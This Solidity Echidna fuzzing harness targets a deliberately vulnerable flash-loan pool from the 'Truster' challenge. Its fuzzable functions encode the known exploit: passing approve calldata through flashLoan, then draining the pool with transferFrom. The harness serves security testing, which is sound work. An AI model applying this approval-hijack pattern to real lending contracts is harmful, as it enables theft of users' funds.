// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20Mint} from "src/exchange/ERC20Mint.sol";
import {TrusterLenderPool} from "src/truster/TrusterLenderPool.sol";

contract TrusterEchidna {
    ERC20Mint public token;
    TrusterLenderPool public pool;
    address public immutable attacker;
    address public immutable recovery = address(0xdeadbeef);
    uint256 public constant INITIAL_POOL_BALANCE = 1_000_000e18;

    constructor() {
        token = new ERC20Mint("ChallengeToken", "CHL");
        pool = new TrusterLenderPool(token);

        token.mint(address(this), INITIAL_POOL_BALANCE);
        token.transfer(address(pool), INITIAL_POOL_BALANCE);

        attacker = address(this);
        token.mint(attacker, 1000e18);
    }

    // Recovery shouldn't have all the pool tokens
    function echidna_recovery_no_tokens() public view returns (bool) {
        return token.balanceOf(recovery) != INITIAL_POOL_BALANCE;
    }

    // Attempt to approve tokens
    function attemptApprovalExploit(uint256 amount) public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, amount);
        try pool.flashLoan(0, attacker, address(token), data) {} catch {}
    }

    // Attempt to drain tokens
    function attemptDrain(uint256 amount) public {
        try token.transferFrom(address(pool), recovery, amount) {} catch {}
    }
}
